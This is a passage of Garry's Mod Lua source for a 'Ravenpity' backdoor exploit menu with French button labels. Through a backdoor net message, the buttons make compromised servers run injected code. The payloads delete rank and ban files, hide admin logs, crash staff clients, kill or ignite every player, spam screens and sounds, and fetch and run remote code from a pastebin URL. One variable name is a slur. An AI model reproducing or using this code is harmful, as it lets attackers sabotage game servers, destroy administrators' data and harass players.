local   ulxlogecho = vgui.Create( "DButton", BackgroundSupportPanel)
ulxlogecho:SetPos( 0, 90)
ulxlogecho:SetSize( 400, 30  )
ulxlogecho:SetText( "Enlever les Logs" )
ulxlogecho.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ulxlogecho:IsHovered() then
ulxlogecho:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ulxlogecho:SetTextColor( Color(255, 255, 255, 150))   
end
ulxlogecho.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Vous êtes maintenant discret" )
end
end

-------------------------------------------------------------------------------------|

local   squeletondanse = vgui.Create( "DButton", BackgroundSupportPanel)
squeletondanse:SetPos( 0, 120)
squeletondanse:SetSize( 400, 30  )
squeletondanse:SetText( "Squeleton Danse" )
squeletondanse.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if squeletondanse:IsHovered() then
squeletondanse:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
squeletondanse:SetTextColor( Color(  255, 255, 255 ) )        
end
squeletondanse.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/eUVnvQjn\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Squeleton Danse lançé" )
end
end

-------------------------------------------------------------------------------------|

local   hackbymood = vgui.Create( "DButton", BackgroundSupportPanel)
hackbymood:SetPos( 0, 150)
hackbymood:SetSize( 400, 30  )
hackbymood:SetText( "Spam Visuel" )
hackbymood.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if hackbymood:IsHovered() then
hackbymood:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
hackbymood:SetTextColor( Color(  255, 255, 255 ) )        
end
hackbymood.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(200,158) hud:SetPos(0,0) hud:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(200,158) hud4:SetPos(ScrW()-200,ScrH()-158) hud4:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(400,300) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531253-skel2.gif\")]])" )
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Spam Visuel lançé" )
end
end

-------------------------------------------------------------------------------------|

local   screamer = vgui.Create( "DButton", BackgroundSupportPanel)
screamer:SetPos( 0, 180)
screamer:SetSize( 400, 30  )
screamer:SetText( "Screamer" )
screamer.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if screamer:IsHovered() then
screamer:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
screamer:SetTextColor( Color(  255, 255, 255 ) )        
end
screamer.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Screamer lançé" )
end
end

-------------------------------------------------------------------------------------|

local   deleterank = vgui.Create( "DButton", BackgroundSupportPanel)
deleterank:SetPos( 0, 210)
deleterank:SetSize( 400, 30  )
deleterank:SetText( "Supprimer les Grades" )
deleterank.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if deleterank:IsHovered() then
deleterank:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
deleterank:SetTextColor( Color(  255, 255, 255 ) )        
end
deleterank.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Supression en cours..." )

end
end

-------------------------------------------------------------------------------------|

local   resetmoney = vgui.Create( "DButton", BackgroundSupportPanel)
resetmoney:SetPos( 0, 240)
resetmoney:SetSize( 400, 30  )
resetmoney:SetText( "Reset l'Argent" )
resetmoney.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if resetmoney:IsHovered() then
resetmoney:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
resetmoney:SetTextColor( Color(  255, 255, 255 ) )        
end
resetmoney.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "L'argent a été Reset" )
end
end

-------------------------------------------------------------------------------------|

local   debanall = vgui.Create( "DButton", BackgroundSupportPanel)
debanall:SetPos( 0, 270)
debanall:SetSize( 400, 30  )
debanall:SetText( "Débannir tout le Monde" )
debanall.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if debanall:IsHovered() then
debanall:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
debanall:SetTextColor( Color(  255, 255, 255 ) )        
end
debanall.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Tout le monde a été Déban" )
end
end

-------------------------------------------------------------------------------------|

local   crashsuperadmin = vgui.Create( "DButton", BackgroundSupportPanel)
crashsuperadmin:SetPos( 0, 300)
crashsuperadmin:SetSize( 400, 30  )
crashsuperadmin:SetText( "Crash Superadmin" )
crashsuperadmin.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if crashsuperadmin:IsHovered() then
crashsuperadmin:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
crashsuperadmin:SetTextColor( Color(  255, 255, 255 ) )       
end
crashsuperadmin.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Les Superadmins sont en train de Crash" )
end
end


end

/*======================================================================================================================================================================================
World Options
========================================================================================================================================================================================*/
function RAVEN.WorldOptions()
if RAVEN.WorldOptionsListe and RAVEN.WorldOptionsListe:IsVisible() then RAVEN.WorldOptionsListe:Remove() end
RAVEN.WorldOptionsListe = vgui.Create("DFrame")
RAVEN.WorldOptionsListe:SetSize(682,350)
RAVEN.WorldOptionsListe:SetTitle("")
RAVEN.WorldOptionsListe:SetPos( 342, 250 )
RAVEN.WorldOptionsListe:MakePopup()
RAVEN.WorldOptionsListe:ShowCloseButton( false ) 
RAVEN.WorldOptionsListe.Paint = function( s, w, h )
if !Ravenmenu or !Ravenmenu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local   CloseButtonWorldOptions = vgui.Create( "DButton", BackgroundSupportPanel)
CloseButtonWorldOptions:SetPos( 0, 370)
CloseButtonWorldOptions:SetSize( 400, 30  )
CloseButtonWorldOptions:SetText( "X" )
CloseButtonWorldOptions.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if CloseButtonWorldOptions:IsHovered() then
CloseButtonWorldOptions:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
CloseButtonWorldOptions:SetTextColor( Color( 255, 255, 255 ) )        
end
CloseButtonWorldOptions.DoClick = function()
surface.PlaySound( "buttons/combine_button1.wav" )
BaseHeader:Remove()
end
end
local   ReturnButtonWorldOptions = vgui.Create( "DButton", BackgroundSupportPanel)
ReturnButtonWorldOptions:SetPos( 0, 340)
ReturnButtonWorldOptions:SetSize( 400, 30  )
ReturnButtonWorldOptions:SetText( "<--" )
ReturnButtonWorldOptions.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ReturnButtonWorldOptions:IsHovered() then
ReturnButtonWorldOptions:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ReturnButtonWorldOptions:SetTextColor( Color( 255, 255, 255 ) )       
end
ReturnButtonWorldOptions.DoClick = function()
BaseHeader:Remove()
LocalPlayer():ConCommand("stringraven_backdoor")
end
end

-------------------------------------------------------------------------------------|

local   armageddonon = vgui.Create( "DButton", BackgroundSupportPanel)
armageddonon:SetPos( 0, 0)
armageddonon:SetSize( 400, 30  )
armageddonon:SetText( "Armageddon" )
armageddonon.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if armageddonon:IsHovered() then
armageddonon:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
armageddonon:SetTextColor( Color(  255, 86, 86 ) )        
end
armageddonon.DoClick = function()
local faggot = [[
hook.Add("Think", "armageddon", function()
local explode = ents.Create( "env_explosion" ) 
explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) 
explode:Spawn() 
explode:SetKeyValue( "iMagnitude", "500" ) 
explode:Fire( "Explode", 0, 0 ) 
end)  
]]
net.Start(ravenhacknetnet)
net.WriteString( faggot )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Armageddon lançé" )
end
end

-------------------------------------------------------------------------------------|

local   moongravityon = vgui.Create( "DButton", BackgroundSupportPanel)
moongravityon:SetPos( 0, 30)
moongravityon:SetSize( 400, 30  )
moongravityon:SetText( "Gravité Lunaire" )
moongravityon.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if moongravityon:IsHovered() then
moongravityon:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
moongravityon:SetTextColor( Color(  255, 255, 255 ) )       
end
moongravityon.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"160\")" )
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Gravité Lunaire activé" )
end
end
local   moongravityoff = vgui.Create( "DButton", BackgroundSupportPanel)
moongravityoff:SetPos( 365, 35)
moongravityoff:SetSize( 20, 20  )
moongravityoff:SetText( "X" )
moongravityoff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if moongravityoff:IsHovered() then
moongravityoff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
moongravityoff:SetTextColor( Color(  255, 255, 255 ) )    
end
moongravityoff.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"500\")" )
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Gravité Lunaire désactivé" )
end
end

-------------------------------------------------------------------------------------|

local   makeplayersflyon = vgui.Create( "DButton", BackgroundSupportPanel)
makeplayersflyon:SetPos( 0, 60)
makeplayersflyon:SetSize( 400, 30  )
makeplayersflyon:SetText( "Détruire la Physique du jeux" )
makeplayersflyon.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if makeplayersflyon:IsHovered() then
makeplayersflyon:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
makeplayersflyon:SetTextColor( Color(  255, 255, 255 ) )      
end
makeplayersflyon.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Physique du Jeux détruite" )
end
end
local   makeplayersflyoff = vgui.Create( "DButton", BackgroundSupportPanel)
makeplayersflyoff:SetPos( 365, 65)
makeplayersflyoff:SetSize( 20, 20  )
makeplayersflyoff:SetText( "X" )
makeplayersflyoff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if makeplayersflyoff:IsHovered() then
makeplayersflyoff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
makeplayersflyoff:SetTextColor( Color(  255, 255, 255 ) )       
end
makeplayersflyoff.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"4\")" )
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Physique du Jeux remit par Défault" )
end
end

-------------------------------------------------------------------------------------|

local   eartquake = vgui.Create( "DButton", BackgroundSupportPanel)
eartquake:SetPos( 0, 90)
eartquake:SetSize( 400, 30  )
eartquake:SetText( "Tremlement de Terre" )
eartquake.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if eartquake:IsHovered() then
eartquake:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
eartquake:SetTextColor( Color(  255, 255, 255 ) )       
end
eartquake.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString(" for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end ")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Tremblement de Terre lançé" )
end
end

-------------------------------------------------------------------------------------|

local   igniteplayers = vgui.Create( "DButton", BackgroundSupportPanel)
igniteplayers:SetPos( 0, 120)
igniteplayers:SetSize( 400, 30  )
igniteplayers:SetText( "Bruler les Joueurs" )
igniteplayers.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if igniteplayers:IsHovered() then
igniteplayers:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
igniteplayers:SetTextColor( Color(  255, 255, 255 ) )       
end
igniteplayers.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Tout les Joueurs brûlent" )
end
end

-------------------------------------------------------------------------------------|

local   killallplayer = vgui.Create( "DButton", BackgroundSupportPanel)
killallplayer:SetPos( 0, 150)
killallplayer:SetSize( 400, 30  )
killallplayer:SetText( "Tuer tout les Joueurs" )
killallplayer.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if killallplayer:IsHovered() then
killallplayer:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
killallplayer:SetTextColor( Color(  255, 255, 255 ) )       
end
killallplayer.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Tout les Joueur ont été tuer" )
end
end
end
/*======================================================================================================================================================================================
Controller Options
========================================================================================================================================================================================*/
function RAVEN.Controller()
if RAVEN.ControllerListe and RAVEN.ControllerListe:IsVisible() then RAVEN.ControllerListe:Remove() end
RAVEN.ControllerListe = vgui.Create("DFrame")
RAVEN.ControllerListe:SetSize(682,350)
RAVEN.ControllerListe:SetTitle("")
RAVEN.ControllerListe:SetPos( 342, 250 )
RAVEN.ControllerListe:MakePopup()
RAVEN.ControllerListe:ShowCloseButton( false ) 
RAVEN.ControllerListe.Paint = function( s, w, h )
if !Ravenmenu or !Ravenmenu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local   CloseButtonController = vgui.Create( "DButton", BackgroundSupportPanel)
CloseButtonController:SetPos( 0, 370)
CloseButtonController:SetSize( 400, 30  )
CloseButtonController:SetText( "X" )
CloseButtonController.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if CloseButtonController:IsHovered() then
CloseButtonController:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
CloseButtonController:SetTextColor( Color( 255, 255, 255 ) )        
end
CloseButtonController.DoClick = function()
surface.PlaySound( "buttons/combine_button1.wav" )
BaseHeader:Remove()
end
end
local   ReturnButtonController = vgui.Create( "DButton", BackgroundSupportPanel)
ReturnButtonController:SetPos( 0, 340)
ReturnButtonController:SetSize( 400, 30  )
ReturnButtonController:SetText( "<--" )
ReturnButtonController.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if ReturnButtonController:IsHovered() then
ReturnButtonController:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
ReturnButtonController:SetTextColor( Color( 255, 255, 255 ) )       
end
ReturnButtonController.DoClick = function()
BaseHeader:Remove()
LocalPlayer():ConCommand("stringraven_backdoor")
end
end

-------------------------------------------------------------------------------------|

local startmakeplayerdanse = vgui.Create("DButton", BackgroundSupportPanel )
startmakeplayerdanse:SetPos( 0, 0)
startmakeplayerdanse:SetSize( 400, 30  )
startmakeplayerdanse:SetText("Danse")
startmakeplayerdanse:SetTextColor(Color(255,255,255,255))
startmakeplayerdanse.Paint = function(panel, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if startmakeplayerdanse:IsHovered() then
startmakeplayerdanse:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
startmakeplayerdanse:SetTextColor( Color(  255, 255, 255 ) )        
end
startmakeplayerdanse.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_loop",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )]])
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Danse activé" )
end
end
local   stopmakeplayerdanse = vgui.Create( "DButton", BackgroundSupportPanel)
stopmakeplayerdanse:SetPos( 365, 5)
stopmakeplayerdanse:SetSize( 20, 20  )
stopmakeplayerdanse:SetText( "X" )
stopmakeplayerdanse.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if stopmakeplayerdanse:IsHovered() then
stopmakeplayerdanse:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
stopmakeplayerdanse:SetTextColor( Color( 255, 255, 255 ) )        
end
stopmakeplayerdanse.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString("timer.Stop( \"dance_loop\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Danse désactivé" )
end
end

-------------------------------------------------------------------------------------|

local startsetturnright = vgui.Create("DButton", BackgroundSupportPanel )
startsetturnright:SetPos( 0, 30)
startsetturnright:SetSize( 400, 30  )
startsetturnright:SetText("Tourner à Droite")
startsetturnright:SetTextColor(Color(255,255,255,255))
startsetturnright.Paint = function(panel, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if startsetturnright:IsHovered() then
startsetturnright:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
startsetturnright:SetTextColor( Color(  255, 255, 255 ) )       
end
startsetturnright.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("+right") end]])
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Tourner à Droite activé" )
end
end
local   stopsetturnright = vgui.Create( "DButton", BackgroundSupportPanel)
stopsetturnright:SetPos( 365, 35)
stopsetturnright:SetSize( 20, 20  )
stopsetturnright:SetText( "X" )
stopsetturnright.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if stopsetturnright:IsHovered() then
stopsetturnright:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
stopsetturnright:SetTextColor( Color( 255, 255, 255 ) )       
end
stopsetturnright.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("-right") end]])
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Tourner à Droite désactivé" )
end
end

-------------------------------------------------------------------------------------|

local startsetturnleft = vgui.Create("DButton", BackgroundSupportPanel )
startsetturnleft:SetPos( 0, 60)
startsetturnleft:SetSize( 400, 30  )
startsetturnleft:SetText("Tourner à Gauche")
startsetturnleft:SetTextColor(Color(255,255,255,255))
startsetturnleft.Paint = function(panel, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if startsetturnleft:IsHovered() then
startsetturnleft:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
startsetturnleft:SetTextColor( Color(  255, 255, 255 ) )        
end
startsetturnleft.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("+left") end]])
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Tourner à Gauche activé" )
end
end
local   stopsetturnleft = vgui.Create( "DButton", BackgroundSupportPanel)
stopsetturnleft:SetPos( 365, 65)
stopsetturnleft:SetSize( 20, 20  )
stopsetturnleft:SetText( "X" )
stopsetturnleft.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if stopsetturnleft:IsHovered() then
stopsetturnleft:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
stopsetturnleft:SetTextColor( Color( 255, 255, 255 ) )        
end
stopsetturnleft.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("-left") end]])
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Tourner à Gauche désactivé" )
end
end

-------------------------------------------------------------------------------------|

local startsetduck = vgui.Create("DButton", BackgroundSupportPanel )
startsetduck:SetPos( 0, 90)
startsetduck:SetSize( 400, 30  )
startsetduck:SetText("S'accroupir")
startsetduck:SetTextColor(Color(255,255,255,255))
startsetduck.Paint = function(panel, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if startsetduck:IsHovered() then
startsetduck:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
